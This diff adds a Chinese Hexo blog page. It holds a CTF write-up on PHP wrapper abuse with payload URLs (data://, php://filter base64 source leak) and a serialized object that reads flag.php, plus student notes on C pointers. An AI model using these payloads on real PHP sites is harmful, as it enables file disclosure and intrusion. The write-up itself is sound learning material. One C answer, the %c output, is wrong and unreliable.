@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-ctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/01/27/ctf/" class="article-date">
+  <time class="dt-published" datetime="2024-01-27T13:37:50.000Z" itemprop="datePublished">2024-01-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/01/27/ctf/">ctf</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF-php伪协议"><a href="#CTF-php伪协议" class="headerlink" title="CTF-php伪协议"></a>CTF-php伪协议</h1><p>各位uu们大家好，今天我分享一下CTF的PHP中的几点看法伪协议问题</p>
+<p>请看源代码</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        echo <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//data伪协议写进去</span><br><span class="line">http://node4.anna.nssctf.cn:28993/?text=data://text/plain，welcome to the zjctf</span><br><span class="line">//防止被过滤，采用base64加密</span><br><span class="line">http://node4.anna.nssctf.cn:28993/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>
+
+<p>写完发现还是不行，想到&#x2F;&#x2F;useless.php</p>
+<p>于是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//提示了useless.php</span><br><span class="line">http://node4.anna.nssctf.cn:28918/?text=data:///text/plain,welcome to the zjctf&amp;file=useless.php</span><br><span class="line">//直接读，读不到useless.php,用filter伪协议读</span><br><span class="line">http://node4.anna.nssctf.cn:28918/?text=data:///text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/Ink/imgs/l/image-20240127195057243.png" alt="image-20240127195057243"></p>
+<p>出现这样一个页面</p>
+<p>php伪协议问题常遇到base编码</p>
+<p>于是打开base编码转化器</p>
+<p><img src="C:/Users/Ink/imgs/l/image-20240127195408688.png" alt="image-20240127195408688"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>看这行代码，提示flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&#x27;flag.php&#x27;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new Flag();//实例化</span><br><span class="line">echo serialize($a);  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>在php在线工具上运行，输出 O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p><img src="C:/Users/Ink/imgs/l/image-20240127195835234.png" alt="image-20240127195835234"></p>
+<p>找到flag</p>
+<h2 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h2><p>熟记解题思路</p>
+<p>php:&#x2F;&#x2F;filter&#x2F;convert.base 64&#x2F;resource&#x3D;文件名</p>
+<p>data伪协议用法：&#x2F;?text&#x3D;data:&#x2F;&#x2F;&#x2F;text&#x2F;plain,</p>
+<p>一般php伪协议先用input ,比如php:&#x2F;&#x2F;input</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/27/ctf/" data-id="clrw56q250006osuo8tu0eenl" data-title="ctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Computer-Science-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/26/Computer-Science-1/" class="article-date">
+  <time class="dt-published" datetime="2023-11-26T15:29:15.000Z" itemprop="datePublished">2023-11-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/26/Computer-Science-1/">Computer Science ()</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="C语言作业中关于指针与数组的一些认识"><a href="#C语言作业中关于指针与数组的一些认识" class="headerlink" title="C语言作业中关于指针与数组的一些认识"></a>C语言作业中关于指针与数组的一些认识</h1><h2 id="1-字符数组很像二维数组？？"><a href="#1-字符数组很像二维数组？？" class="headerlink" title="1.字符数组很像二维数组？？"></a>1.字符数组很像二维数组？？</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//有以下程序</span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *a[]=&#123;<span class="string">&quot;abcd&quot;</span>,<span class="string">&quot;ef&quot;</span>,<span class="string">&quot;gh&quot;</span>,<span class="string">&quot;ijk&quot;</span>&#125;;<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line"></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//程序运行后输出的结果是(    )。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是一个指针数组，也就是说a里面包含着这四个字符串的地址。注意到，字符串的输出，只要给出首地址，所以，输出结果显然是</p>
+<p>abcdefghijk</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">有以下程序</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *a[]=&#123;<span class="string">&quot;abcd&quot;</span>,<span class="string">&quot;ef&quot;</span>,<span class="string">&quot;gh&quot;</span>,<span class="string">&quot;ijk&quot;</span>&#125;;<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line"></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,*a[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">程序运行后输出的结果是(    )。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这次的输出加上了一个*，一开始我以为加上 *不影响输出结果，因为我认为a里面存着地址嘛，加上星号才找到元素。但这样想就错了，字符指针数组它有点像二维数组， *使得它指向第一个字符串的首字母。所以，它的输出为aegi</p>
+<p>下面看个题目</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//【题目描述】编写一程序，功能是：输入n个国家名称，使用选择法排序从小到大排序后输出，输出时每个名称间用一个空格隔开。例如：</span></span><br><span class="line"><span class="comment">//输入：China France Britain Russia America</span></span><br><span class="line"><span class="comment">//输出：America Britain China France Russia</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line">	<span class="type">char</span>* temp;</span><br><span class="line">	<span class="type">char</span>*p[<span class="number">1000</span>];</span><br><span class="line">	<span class="type">int</span> i,n,j;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	   <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p[i]=str[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;n;j++)</span><br><span class="line">	  &#123;</span><br><span class="line">		  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p[i],p[j])&gt;<span class="number">0</span>)</span><br><span class="line">		  &#123;</span><br><span class="line">			  temp=p[i];</span><br><span class="line">			  p[i]=p[j];</span><br><span class="line">			  p[j]=temp;</span><br><span class="line"></span><br><span class="line">		  &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>,p[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里我们运用了一个选择排序算法，（我本人想强化一下指针的运用，于是用指针写了这题），这里输出我们用p[i]，打印出所以的字符串</p>
+<h2 id="2-二维数组题目的一些小分享"><a href="#2-二维数组题目的一些小分享" class="headerlink" title="2.二维数组题目的一些小分享"></a>2.二维数组题目的一些小分享</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> a[<span class="number">2</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(a[<span class="number">0</span>],<span class="string">&quot;are&quot;</span>);<span class="built_in">strcpy</span>(a[<span class="number">1</span>],<span class="string">&quot;you&quot;</span>);</span><br><span class="line"></span><br><span class="line">        a[<span class="number">0</span>][<span class="number">3</span>]=<span class="string">&#x27;&amp;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,a[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>a为一个二维数组，strcpy()将 are复制过去，所以a的第0行为 are\0</p>
+<p>同理，a的第1行为you\0，&amp;把\0替换掉</p>
+<p>所以输出are&amp;you</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//有以下程序</span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line">&#123;<span class="type">char</span> str[][<span class="number">10</span>]=&#123;<span class="string">&quot;China&quot;</span>,<span class="string">&quot;Beijing&quot;</span>&#125;,*p=*str;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p+<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//程序运行后的输出结果是（     ）。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先定义了一个二维数组，这个二维数组的存放张这样</p>
+<table>
+<thead>
+<tr>
+<th>0</th>
+<th>1</th>
+<th>2</th>
+<th>3</th>
+<th>4</th>
+<th>5</th>
+<th>6</th>
+<th>7</th>
+<th>8</th>
+<th>9</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>1</strong></td>
+<td>C</td>
+<td>h</td>
+<td>i</td>
+<td>n</td>
+<td>a</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>2</strong></td>
+<td>B</td>
+<td>e</td>
+<td>i</td>
+<td>j</td>
+<td>i</td>
+<td>n</td>
+<td>g</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>注意到这个语句  char *p&#x3D; *str； 注意区分 char *p&#x3D;str;</p>
+<p>p从str[0] [0]开始，p+10指向str[1] [0]，也就是指向第1行，由于字符串的输出只需要给出首地址，所以输出结果是Beijing</p>
+<p>注意区分p+10 和*(p+10),后者输出后是单个str [1] [0]元素，前者是str [1] [0] 的地址，输出时会把整个字符串输出。所以这就是和第一个例子吻合了 。字符指针数组和二维数组非常相似。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/26/Computer-Science-1/" data-id="clrw56q210003osuobz2jchri" data-title="Computer Science ()" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Computer-science-2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/12/Computer-science-2/" class="article-date">
+  <time class="dt-published" datetime="2023-11-12T10:57:27.000Z" itemprop="datePublished">2023-11-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/12/Computer-science-2/">Computer science(2)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="点评一下大辉老师的学习通题目"><a href="#点评一下大辉老师的学习通题目" class="headerlink" title="点评一下大辉老师的学习通题目"></a>点评一下大辉老师的学习通题目</h1><h2 id="C语言程序设计"><a href="#C语言程序设计" class="headerlink" title="C语言程序设计"></a>C语言程序设计</h2><h4 id="数组与指针（2）"><a href="#数组与指针（2）" class="headerlink" title="数组与指针（2）"></a>数组与指针（2）</h4><ol>
+<li><img src="/../imgs/l/IMG_20231112_190441.jpg"></li>
+</ol>
+<p>这题简单，a是一个数组，p是一个指针，A中把数组赋给整型指针，将数组转化为指针类型，错误。</p>
+<p>B中，*q[4] 根据运算优先级，q先于[]结合，所以 *q[4]是一个指针数组（一个数组里面存的全是指针），a[i]是一个指针。所以B的赋值正确</p>
+<p>C中，p是一个指针，a[i]也是指针，正确</p>
+<p>D，太简单不解释</p>
+<p>2.<img src="/../imgs/l/2.jpg"></p>
+<p>声明了一个3行2列的数组，A,B,D选项都超出了范围</p>
+<p><img src="/../imgs/l/3.jpg"></p>
+<p>这题的C选项里面漏了0 </p>
+<p>A只是声明变量。B花括号外面不应该有数字。D超出了行数。</p>
+<p>第4题基础，不写</p>
+<p>第5题</p>
+<p><img src="/../imgs/l/4.jpg"></p>
+<p>p从a的首地址开始，第一个for 给数组赋值，第二个for输出数组</p>
+<p><img src="/../imgs/l/6.jpg"></p>
+<p>*p[3]表示一个指针数组，数组里面存了三个指针。p[0]&#x3D;a[1];表示p中元素从指针a[1]开始，p[0]+1就是a[1] [1]的地址.</p>
+<p><img src="/../imgs/l/7.jpg"></p>
+<p>根据数组的初始化，得出数组为 </p>
+<p>​     <strong>1 2 0</strong></p>
+<p>​     <strong>3 4 0</strong></p>
+<p>​     <strong>5 6 0</strong></p>
+<p>sum&#x3D;  a[1] [0]  + a[1] [1]+ a[2] [0]+ a[2] [1]+a[2] [2];</p>
+<p>​        &#x3D;   3+4+5+6&#x3D;18</p>
+<p>第8题 注意到列数组初始化一定要有参数</p>
+<p><img src="/../imgs/l/9.jpg"></p>
+<p>​                                                          </p>
+<p>（*p)[5]表示p是一个地址，这个地址指向一个数组，所以p[0]就是一个元素的地址了，p&#x3D;c表示p指向数组c，p就是c的首地址，p+1表示c[1]，不能指向元素。 <em>(p+3)表示</em></p>
+<p> *(c[3]), *(p+1)+3 表示 *（c[1])+3,不能表示元素。 *(p[0]+2) 表示 *(c[0]+2)就是 *(c[0] [2]).</p>
+<p>10.<img src="/../imgs/l/10.jpg"></p>
+<p>a+i表示指向a[i] [0],即指向二维数组第一行起始位置 ，可以理解为a+i 就是a[i]的地址，*使得它为a[i] [0]的地址，加上j后 就是a[i] [j]的地址。 本质上，a就是指针的指针，需要经过两次 *</p>
+<p>最后附上一张表</p>
+<table>
+<thead>
+<tr>
+<th align="center">指针</th>
+<th align="center">指针p指向</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">p&#x3D;a</td>
+<td align="center">指向二维数组a</td>
+<td align="center">指向二维数组的起始位置</td>
+</tr>
+<tr>
+<td align="center">p&#x3D;a+1</td>
+<td align="center">指向二维数组a[1] [0]</td>
+<td align="center">指向二维数组第1行起始位置</td>
+</tr>
+<tr>
+<td align="center">p&#x3D;&amp;a[0] [0]+1</td>
+<td align="center">指向二维数组a[0] [1]</td>
+<td align="center">指向二维数组第0行第1列</td>
+</tr>
+<tr>
+<td align="center">p&#x3D;*a+1</td>
+<td align="center">指向二维数组a[0] [1]</td>
+<td align="center">指向二维数组第0行第1列</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/12/Computer-science-2/" data-id="clrw56q220004osuo838o6vrn" data-title="Computer science(2)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Computer-Science-0" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/02/Computer-Science-0/" class="article-date">
+  <time class="dt-published" datetime="2023-11-02T09:28:55.000Z" itemprop="datePublished">2023-11-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/02/Computer-Science-0/">Computer Science</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/02/Computer-Science-0/" data-id="clrw56q1z0002osuof5xrekvj" data-title="Computer Science" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="computer-Compuer-science" class="h-entry article article-type-computer" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/02/Compuer-science/" class="article-date">
+  <time class="dt-published" datetime="2023-11-02T08:57:54.000Z" itemprop="datePublished">2023-11-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/02/Compuer-science/">science</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Compuer-science"><a href="#Compuer-science" class="headerlink" title="Compuer science"></a>Compuer science</h1><h2 id="C语言程序设计："><a href="#C语言程序设计：" class="headerlink" title="C语言程序设计："></a>C语言程序设计：</h2><h3 id="static的性质"><a href="#static的性质" class="headerlink" title="static的性质"></a>static的性质</h3><p>各位uu们大家好，今天我分享一下作为初学者对static在C语言程序设计中的几点看法</p>
+<p>首先给大家介绍一下两个概念，作用域和生命周期：</p>
+<ul>
+<li><p>作用域  ：一段程序代码中的名字不总是有效的，而限定这个名字的可用性时这个名字的作用域</p>
+<ul>
+<li>局部变量的作用域时变量所在的局部范围</li>
+<li>全局变量的作用域是整个工程</li>
+</ul>
+</li>
+<li><p>生命周期：指变量的创建到变量的销毁之间的一个时间段</p>
+<ul>
+<li>局部变量的生命周期是：进入局部变量创建，生命周期开始，出作用域生命周期结束</li>
+<li>全局变量的生命周期是：整个程序的生命周期</li>
+</ul>
+</li>
+</ul>
+<p>下面看我演示</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> a=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>变量a打印不出结果，因为a的作用域在花括号内，出了作用域a被销毁。</p>
+<p>而static的作用是改变变量的生命周期（不改变作用域）</p>
+<ul>
+<li>先说一下static的性质（面试爱考（狗头））<ul>
+<li>修饰全局变量</li>
+<li>修饰局部变量</li>
+<li>修饰函数</li>
+</ul>
+</li>
+</ul>
